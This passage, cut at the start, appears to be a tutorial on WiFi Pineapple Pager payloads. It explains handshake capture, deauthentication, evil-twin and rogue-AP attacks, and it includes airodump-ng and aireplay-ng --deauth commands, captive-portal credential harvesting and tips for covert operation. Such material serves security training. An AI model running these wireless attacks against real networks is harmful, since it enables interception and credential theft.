│ └─────────────────────────────────────────────────────────────────┘         │
│                                                                              │
│ WIFI PINEAPPLE PAGER:                                                        │
│ ┌─────────────────────────────────────────────────────────────────┐         │
│ │ TARGET: WiFi networks and clients in the air                    │         │
│ │ METHOD: Captures, intercepts, and impersonates WiFi networks    │         │
│ │ RESULT: Captures handshakes, credentials, network traffic       │         │
│ │                                                                  │         │
│ │    [Pager] ~~WiFi~~► [Access Points & Clients]                  │         │
│ │             Captures wireless traffic                           │         │
│ └─────────────────────────────────────────────────────────────────┘         │
│                                                                              │
│ THE PAGER RUNS LINUX:                                                        │
│ Unlike the Flipper (microcontroller), the Pager runs full Linux.            │
│ This means it can run standard Linux tools like:                             │
│ • aircrack-ng suite (WiFi hacking tools)                                    │
│ • tcpdump (packet capture)                                                  │
│ • hostapd (access point creation)                                           │
│ • Python scripts, Bash scripts, etc.                                        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### How Pager Payloads Execute

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ PAGER PAYLOAD EXECUTION FLOW                                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ STEP 1: You create a Bash script (payload.sh)                               │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ #!/bin/bash                                                        │      │
│ │ NOTIFY "Starting attack..."                                        │      │
│ │ LED yellow                                                          │      │
│ │ airodump-ng wlan1 -w /root/loot/capture                           │      │
│ │ NOTIFY "Capture complete"                                          │      │
│ │ LED green                                                          │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ STEP 2: Upload to Pager at /root/payloads/user/myattack/payload.sh         │
│                                                                              │
│ STEP 3: Navigate on Pager menu → Select payload → Run                       │
│                                                                              │
│ STEP 4: Pager's Linux system executes the Bash script                       │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │   /bin/bash /root/payloads/user/myattack/payload.sh               │      │
│ │                                                                    │      │
│ │   The script runs ON THE PAGER, not on any target computer!       │      │
│ │                                                                    │      │
│ │   What the script does:                                           │      │
│ │   1. NOTIFY - Shows message on Pager's screen                    │      │
│ │   2. LED - Changes Pager's LED color                             │      │
│ │   3. airodump-ng - Captures WiFi traffic using Pager's radios    │      │
│ │   4. Saves to Pager's storage                                    │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ STEP 5: Results saved to /root/loot/ on Pager                               │
│                                                                              │
│ STEP 6: Retrieve results via SSH or USB                                     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Pager-Specific Commands Explained

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ PAGER DUCKYOSCRIPT COMMANDS (NOT standard Bash!)                             │
├─────────────────────────────────────────────────────────────────────────────┤

│ │ NOTIFY "message"                                                   │      │

│ │ ON THE PAGER:                                                      │      │
│ │ ┌─────────────────────────────┐                                   │      │
│ │ │ ┌─────────────────────────┐ │                                   │      │
│ │ │ │  📢 message             │ │  ← Popup appears                  │      │
│ │ │ └─────────────────────────┘ │                                   │      │
│ │ │      [Normal screen]        │                                   │      │
│ │ └─────────────────────────────┘                                   │      │
│ │                                                                    │      │
│ │ WHY IT'S USEFUL:                                                   │      │
│ │ - Gives you feedback that the script is running                   │      │
│ │ - Shows progress/status updates                                   │      │
│ │ - Alerts you when something important happens                     │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ LED COMMANDS:                                                                │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ LED <color>                                                        │      │
│ │ ───────────                                                        │      │
│ │ Colors: red, green, blue, yellow, cyan, magenta, white            │      │
│ │                                                                    │      │
│ │ WHAT IT DOES: Changes the LED on the Pager device                 │      │
│ │                                                                    │      │
│ │ USE CASE EXAMPLES:                                                 │      │
│ │ LED yellow  → Script is running, in progress                      │      │
│ │ LED green   → Success! Capture complete                           │      │
│ │ LED red     → Error occurred                                      │      │
│ │ LED blue    → Attack active                                       │      │
│ │ LED_OFF     → Script finished, return to normal                   │      │
│ │                                                                    │      │
│ │ WHY LEDS MATTER:                                                   │      │
│ │ When Pager is in your pocket during an engagement, you can        │      │
│ │ glance at it and know the status without looking at the screen!  │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ VIBRATE COMMAND:                                                             │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ VIBRATE <milliseconds>                                             │      │
│ │ ────────────────────────                                           │      │
│ │ Example: VIBRATE 500  → Vibrates for half a second                │      │
│ │          VIBRATE 1000 → Vibrates for one second                   │      │
│ │                                                                    │      │
│ │ USE CASE:                                                          │      │
│ │ When the Pager is hidden (pocket, bag), vibration alerts you     │      │
│ │ that something happened:                                          │      │
│ │ - Short vibrate (200ms) = Status update                          │      │
│ │ - Long vibrate (1000ms) = Important event (handshake captured!)  │      │
│ │                                                                    │      │
│ │ PATTERN EXAMPLE:                                                   │      │
│ │ VIBRATE 200; sleep 0.2; VIBRATE 200; sleep 0.2; VIBRATE 200      │      │
│ │ ↑ Three short vibrations = "Handshake captured!"                  │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ RINGTONE COMMAND:                                                            │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ RINGTONE <name>                                                    │      │
│ │ ───────────────                                                    │      │
│ │ Names: success, error, alert, pwned, startup, shutdown            │      │
│ │                                                                    │      │
│ │ WHAT IT DOES: Plays a predefined sound from Pager's speaker       │      │
│ │                                                                    │      │
│ │ USE CASE:                                                          │      │
│ │ RINGTONE success  → Mission accomplished!                         │      │
│ │ RINGTONE error    → Something went wrong                          │      │
│ │ RINGTONE pwned    → You got a handshake/credential! 🎉            │      │
│ │                                                                    │      │
│ │ ⚠️ WARNING: Sound is NOT stealthy!                                 │      │
│ │ Only use audio feedback in controlled environments                │      │
│ │ For covert operations, use vibration only                        │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ LOG COMMAND:                                                                 │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ LOG "message"                                                      │      │
│ │ ─────────────                                                      │      │
│ │ WHAT IT DOES: Writes timestamped entry to the payload log file    │      │
│ │                                                                    │      │
│ │ LOG "Starting recon phase"                                         │      │
│ │ → Writes: [2025-12-27 10:30:45] Starting recon phase             │      │
│ │                                                                    │      │
│ │ WHY IT'S CRITICAL:                                                 │      │
│ │ - Debugging: See what happened if script fails                   │      │
│ │ - Evidence: Document what the payload did                        │      │
│ │ - Timing: Know when events occurred                              │      │
│ │ - Reporting: Build engagement timeline                           │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### WiFi Attack Concepts for Pager

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ WIFI ATTACK FUNDAMENTALS (What Pager Payloads Actually Do)                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ ATTACK TYPE 1: PASSIVE RECONNAISSANCE (Scanning)                             │
│ ────────────────────────────────────────────────                             │
│                                                                              │
│ WHAT IT DOES:                                                                │
│ Listens to WiFi traffic in the air without sending any packets.             │
│                                                                              │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │   Access Points broadcasting their names (beacons):                │      │
│ │                                                                    │      │
│ │   📡 CoffeeShop ─────────────┐                                    │      │
│ │   📡 HomeNetwork ────────────┼──► [Pager] (listening)             │      │
│ │   📡 CorpWiFi ───────────────┘     "I see all of you!"            │      │
│ │                                                                    │      │
│ │   Clients sending probe requests:                                 │      │
│ │                                                                    │      │
│ │   📱 "Is 'MyHomeWifi' here?"──┐                                   │      │
│ │   💻 "Is 'WorkNetwork' here?"─┼─► [Pager] (listening)             │      │
│ │                                    "I know your history!"         │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ COMMANDS USED:                                                               │
│ • airodump-ng wlan1              # Lists all visible networks               │
│ • iwlist wlan0 scan              # Quick scan                               │
│                                                                              │
│ WHAT YOU LEARN:                                                              │
│ • Network names (SSIDs)                                                      │
│ • MAC addresses of access points (BSSIDs)                                   │
│ • Encryption types (WPA2, WPA3, Open)                                       │
│ • Channel numbers                                                            │
│ • Connected clients                                                          │
│ • Client probe requests (networks they've connected to before)              │
│                                                                              │
│ ─────────────────────────────────────────────────────────────────────────── │
│                                                                              │
│ ATTACK TYPE 2: WPA HANDSHAKE CAPTURE                                         │
│ ────────────────────────────────────                                         │
│                                                                              │
│ WHAT IT DOES:                                                                │
│ Captures the "4-way handshake" that happens when a client connects.         │
│ This handshake can be cracked offline to reveal the WiFi password.          │
│                                                                              │
│ THE PROCESS:                                                                 │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ NORMAL CONNECTION (What we're capturing):                         │      │
│ │                                                                    │      │
│ │    📱 Client                        📡 Access Point               │      │
│ │       │                                  │                        │      │
│ │       │───── Message 1 (ANonce) ────────►│                        │      │
│ │       │◄──── Message 2 (SNonce) ─────────│                        │      │
│ │       │───── Message 3 (Install key) ───►│                        │      │
│ │       │◄──── Message 4 (Confirm) ────────│                        │      │
│ │       │                                  │                        │      │
│ │                                                                    │      │
│ │    ↑ [Pager] is listening and captures all 4 messages!            │      │
│ │                                                                    │      │
│ │ WHY THIS MATTERS:                                                  │      │
│ │ With the handshake captured, you can try passwords offline:       │      │
│ │ • No need to stay near the network                                │      │
│ │ • Can try millions of passwords per second with GPU               │      │
│ │ • Network has no idea you're cracking their password              │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ COMMANDS USED:                                                               │
│ • airodump-ng wlan1 -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake             │
│   (Capture on channel 6, targeting specific AP, save to file)              │
│                                                                              │
│ THE PROBLEM:                                                                 │
│ Handshakes only happen when clients connect. If everyone's already          │
│ connected, you might wait hours for a handshake.                            │
│                                                                              │
│ THE SOLUTION: Deauthentication attack (see next)                            │
│                                                                              │
│ ─────────────────────────────────────────────────────────────────────────── │
│                                                                              │
│ ATTACK TYPE 3: DEAUTHENTICATION                                              │
│ ──────────────────────────────────                                           │
│                                                                              │
│ WHAT IT DOES:                                                                │
│ Kicks clients off the network so they reconnect (and you capture the        │
│ handshake during reconnection).                                              │
│                                                                              │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │   BEFORE DEAUTH:                                                   │      │
│ │   📱 Client ────connected──── 📡 Access Point                     │      │
│ │   (Nothing to capture - already authenticated)                    │      │
│ │                                                                    │      │
│ │   DEAUTH ATTACK:                                                   │      │
│ │   [Pager] ───"DISCONNECT!"──► 📱 Client                           │      │
│ │            (Spoofed packet                                        │      │
│ │             looks like AP)                                        │      │
│ │                                                                    │      │
│ │   AFTER DEAUTH:                                                    │      │
│ │   📱 Client ────reconnecting──── 📡 Access Point                  │      │
│ │          ↑                                                         │      │
│ │      [Pager] captures the handshake!                              │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ COMMANDS USED:                                                               │
│ • aireplay-ng --deauth 10 -a <BSSID> wlan1                                  │
│   (Send 10 deauth frames to kick all clients)                              │
│ • aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan1                 │
│   (Target specific client)                                                  │
│                                                                              │
│ ⚠️ DETECTION:                                                                │
│ Deauth attacks are VERY noisy and can be detected by WIDS/WIPS systems.    │
│ WPA3 with Protected Management Frames (PMF) makes this attack harder.       │
│                                                                              │
│ ─────────────────────────────────────────────────────────────────────────── │
│                                                                              │
│ ATTACK TYPE 4: EVIL TWIN                                                     │
│ ────────────────────────                                                     │
│                                                                              │
│ WHAT IT DOES:                                                                │
│ Creates a fake access point that looks like the real one. Clients           │
│ connect to your fake AP instead, and you intercept all their traffic.       │
│                                                                              │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │   📡 Real "CoffeeShop" AP (channel 6, password protected)        │      │
│ │                                                                    │      │
│ │   📡 EVIL TWIN "CoffeeShop" (channel 1, open or captive portal)  │      │
│ │      ↑ Created by Pager                                           │      │
│ │                                                                    │      │
│ │   📱 Victim's phone: "I see two CoffeeShops... I'll connect to   │      │
│ │                       the stronger one!"                          │      │
│ │                                                                    │      │
│ │   📱 ──────connects to────── 📡 EVIL TWIN                         │      │
│ │                                    │                               │      │
│ │                                    └──► Traffic goes through      │      │
│ │                                         Pager! Man-in-the-middle  │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ COMPONENTS NEEDED:                                                           │
│ • hostapd - Creates the fake access point                                   │
│ • dnsmasq - Provides DHCP (IP addresses) to victims                         │
│ • iptables - Routes traffic (for internet or captive portal)                │
│ • Captive portal (optional) - Fake login page to capture credentials        │
│                                                                              │
│ WHAT YOU CAN DO:                                                             │
│ • Capture credentials from unencrypted sites                                │
│ • Present fake login pages (credential harvesting)                          │
│ • Inject content into HTTP traffic                                          │
│ • Monitor browsing habits                                                    │
│ • SSL strip (downgrade HTTPS to HTTP) - less effective now                 │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### RECON Suite - Network Discovery

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ RECON: "WHAT'S OUT THERE?"                                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ PURPOSE:                                                                     │
│ Scan the wireless environment to discover Access Points (APs), clients,     │
│ and gather intelligence before launching any attacks.                        │
│                                                                              │
│ WHAT RECON SHOWS YOU:                                                        │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ ACCESS POINTS DISCOVERED:                                          │      │
│ │ ┌──────────────────────────────────────────────────────────────┐  │      │
│ │ │ SSID            BSSID              CH   SEC      PWR  CLIENTS│  │      │
│ │ │────────────────────────────────────────────────────────────────│  │      │
│ │ │ CoffeeShop     AA:BB:CC:DD:EE:01   6   WPA2    -45    12     │  │      │
│ │ │ CorpWiFi       AA:BB:CC:DD:EE:02   11  WPA2-E  -52     8     │  │      │
│ │ │ Guest_Network  AA:BB:CC:DD:EE:03   1   Open    -60     3     │  │      │
│ │ │ [Hidden]       AA:BB:CC:DD:EE:04   36  WPA3    -68     1     │  │      │
│ │ └──────────────────────────────────────────────────────────────┘  │      │
│ │                                                                    │      │
│ │ CLIENTS DISCOVERED:                                                │      │
│ │ ┌──────────────────────────────────────────────────────────────┐  │      │
│ │ │ MAC               VENDOR          PROBES                      │  │      │
│ │ │────────────────────────────────────────────────────────────────│  │      │
│ │ │ 11:22:33:44:55:66 Apple           HomeWiFi, WorkNet          │  │      │
│ │ │ 22:33:44:55:66:77 Samsung         AndroidAP                  │  │      │
│ │ │ 33:44:55:66:77:88 Intel           Office_5G, Guest           │  │      │
│ │ └──────────────────────────────────────────────────────────────┘  │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ UNDERSTANDING RECON DATA:                                                    │
│ ┌───────────────┬────────────────────────────────────────────────────┐      │
│ │ Field         │ Meaning                                            │      │
│ ├───────────────┼────────────────────────────────────────────────────┤      │
│ │ SSID          │ Network name (what you see in WiFi list)          │      │
│ │ BSSID         │ MAC address of the Access Point (unique ID)       │      │
│ │ CH            │ WiFi channel (1-14 for 2.4GHz, 36-165 for 5GHz)   │      │
│ │ SEC           │ Security: Open, WEP, WPA, WPA2, WPA2-E, WPA3     │      │
│ │ PWR           │ Signal strength (closer to 0 = stronger)          │      │
│ │ CLIENTS       │ Number of connected devices                        │      │
│ │ PROBES        │ Networks the client has previously connected to   │      │
│ │ VENDOR        │ Device manufacturer (derived from MAC prefix)     │      │
│ └───────────────┴────────────────────────────────────────────────────┘      │
│                                                                              │
│ WHY PROBE REQUESTS MATTER:                                                   │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ When your phone isn't connected to WiFi, it constantly broadcasts │      │
│ │ "PROBE REQUESTS" asking: "Is [network X] here?"                   │      │
│ │                                                                    │      │
│ │ Your phone: "Is 'HomeWiFi' here? Is 'Starbucks' here?"           │      │
│ │                                                                    │      │
│ │ SECURITY IMPLICATION:                                              │      │
│ │ These probes reveal YOUR WiFi history to anyone listening!        │      │
│ │                                                                    │      │
│ │ Attacker learns:                                                   │      │
│ │ • Networks you've connected to before                             │      │
│ │ • Where you live ("HomeNetwork_123MainSt")                        │      │
│ │ • Where you work ("CorpNet_AcmeCorp")                              │      │
│ │ • Hotels you've stayed at                                          │      │
│ │ • Coffee shops you visit                                          │      │
│ │                                                                    │      │
│ │ ATTACK USE:                                                        │      │
│ │ If we see your phone probing for "HomeWiFi", we can create        │      │
│ │ a fake "HomeWiFi" network. Your phone will auto-connect!          │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ RECON MODES:                                                                 │
│ • Passive Scan: Just listen, don't transmit (stealthiest)                  │
│ • Active Scan: Send probe requests to discover hidden networks             │
│ • Targeted Scan: Focus on specific channel or SSID                         │
│ • Continuous Scan: Keep scanning until stopped                              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### PineAP Suite - The Attack Engine

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ PINEAP: "THE ROGUE ACCESS POINT ENGINE"                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ PURPOSE:                                                                     │
│ Create fake WiFi networks that impersonate legitimate ones. When clients    │
│ connect to your fake network, you can intercept their traffic.              │
│                                                                              │
│ HOW PINEAP WORKS:                                                            │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ STEP 1: Victim's phone broadcasts probe requests                   │      │
│ │                                                                    │      │
│ │   📱 Victim ───"Is 'CoffeeShop' here?"────►                       │      │
│ │               "Is 'HomeWiFi' here?"                                │      │
│ │               "Is 'Airport_Free' here?"                            │      │
│ │                                                                    │      │
│ │ STEP 2: PineAP hears ALL these requests                           │      │
│ │                                                                    │      │
│ │   [Pager] ◄─── Collecting all probe requests ───                  │      │
│ │           "I now know what networks they want!"                   │      │
│ │                                                                    │      │
│ │ STEP 3: PineAP responds to EVERY probe as that network!           │      │
│ │                                                                    │      │
│ │   [Pager] ───"Yes, I AM CoffeeShop!"────► 📱                      │      │
│ │          ───"Yes, I AM HomeWiFi!"────►                            │      │
│ │          ───"Yes, I AM Airport_Free!"────►                        │      │
│ │                                                                    │      │
│ │ STEP 4: Victim auto-connects to fake network                      │      │
│ │                                                                    │      │
│ │   📱 ────────connecting to "CoffeeShop"──────► [Pager]            │      │
│ │              (Which is actually the Pager!)                       │      │
│ │                                                                    │      │
│ │ STEP 5: All victim traffic flows through Pager                    │      │
│ │                                                                    │      │
│ │   📱 ──HTTP/DNS/etc.──► [Pager] ──intercept──► Internet          │      │
│ │                            │                                       │      │
│ │                    Logging everything!                            │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ PINEAP FEATURES:                                                             │
│ ┌───────────────────────┬────────────────────────────────────────────┐      │
│ │ Feature               │ What It Does                               │      │
│ ├───────────────────────┼────────────────────────────────────────────┤      │
│ │ Broadcast Pool        │ List of SSIDs to actively broadcast       │      │
│ │ Probe Response        │ Auto-respond to any probe request         │      │
│ │ SSID Harvesting       │ Collect SSIDs from probes automatically   │      │
│ │ Client Filtering      │ Only respond to specific MAC addresses    │      │
│ │ Deauth                │ Kick clients off legitimate networks      │      │
│ │ Captive Portal        │ Show fake login page to connected clients │      │
│ └───────────────────────┴────────────────────────────────────────────┘      │
│                                                                              │
│ PINEAP CONFIGURATION MODES:                                                  │
│                                                                              │
│ 1. PASSIVE COLLECTION (Stealthy):                                           │
│    ┌────────────────────────────────────────────────────────────────┐       │
│    │ Just collect probe requests without responding                 │       │
│    │ Build a list of networks victims want                         │       │
│    │ Use this for recon before actual attack                       │       │
```

### Pager DuckyScript Commands

#### Display Commands
| Command | Description |
|---------|-------------|
| `NOTIFY "msg"` | Show notification |
| `LOG "msg"` | Write to log |
| `PRINT "msg"` | Print to screen |

#### Audio/Haptic Commands
| Command | Description |
|---------|-------------|
| `RINGTONE name` | Play ringtone |
| `VIBRATE ms` | Vibrate for duration |
| `BEEP freq dur` | Play tone |

#### LED Commands
| Command | Description |
|---------|-------------|
| `LED color` | Set LED color |
| `LED_OFF` | Turn off LEDs |

#### PineAP Commands
| Command | Description |
|---------|-------------|
| `PINEAP_START` | Start PineAP engine |
| `PINEAP_STOP` | Stop PineAP engine |
| `DEAUTH target` | Send deauth frames |

### [PP-B05] Battery Status

```bash
#!/bin/bash
# =============================================
# BASIC: Battery Check
# Type: User Payload
# Action: Display battery percentage
# Skill: Basic
# =============================================

# Get battery info (adjust path as needed)
battery=$(cat /sys/class/power_supply/battery/capacity 2>/dev/null || echo "N/A")

if [ "$battery" != "N/A" ]; then
    NOTIFY "Battery: ${battery}%"
    
    if [ "$battery" -lt 20 ]; then
        RINGTONE warning
        VIBRATE 500
    else
        RINGTONE success
    fi
else
    NOTIFY "Battery info unavailable"
fi
```
